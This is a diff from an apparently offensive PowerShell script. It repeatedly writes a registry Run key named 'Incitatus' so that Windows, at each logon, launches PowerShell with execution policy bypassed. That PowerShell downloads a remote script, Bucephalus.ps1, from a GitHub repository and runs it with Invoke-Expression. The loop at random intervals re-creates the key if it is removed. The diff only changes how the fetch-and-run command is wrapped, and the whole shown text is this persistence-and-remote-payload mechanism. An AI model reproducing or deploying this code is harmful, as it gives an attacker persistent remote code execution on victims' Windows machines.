@@ -100,11 +100,11 @@ start-job -ScriptBlock{
 start-job -ScriptBlock { 
     while(1 -eq 1){
         try{
-            New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-command -scriptblock { Invoke-Expression invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 }' -NonInteractive -ExecutionPolicy Bypass"  -PropertyType "String"
+            New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-expression { invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 }' -NonInteractive -ExecutionPolicy Bypass"  -PropertyType "String"
         
         }
         catch{
-            Set-Itemproperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-command -scriptblock { Invoke-Expression invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 }' -NonInteractive -ExecutionPolicy Bypass"
+            Set-Itemproperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-expression { invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 }' -NonInteractive -ExecutionPolicy Bypass"
         }
         start-sleep -Seconds (get-random -Minimum 5 -Maximum 10)
     }
